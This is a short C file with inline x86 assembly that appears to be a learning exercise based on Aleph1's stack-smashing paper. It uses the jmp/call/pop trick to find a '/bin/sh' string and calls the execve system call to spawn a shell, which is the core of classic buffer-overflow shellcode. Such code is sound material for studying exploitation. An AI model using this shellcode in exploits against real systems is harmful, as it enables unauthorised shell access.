
// obtains the address directly using jmp and then call
// have a look at alpeh1's paper 

 void main(void){
 asm( 
        "jmp .+0x20;"              // jmp to call
	"popl %esi;"               // obtain address of string
        "movl %esi, 0x8(%esi);"
 	"movb $0x0, 0x7(%esi);"
	"movl $0x0, 0xc(%esi);"
	"movl $0xb, %eax;"
	"movl %esi, %ebx;"
	"leal 0x8(%esi), %ecx;"
	"leal 0xc(%esi), %edx;"
	"int $0x80;"
	"call .-0x1e;"             // call pop instr
	".section .data;"
	"1: .string \"/bin/sh         \";"
	".section .text;"
    );
 }
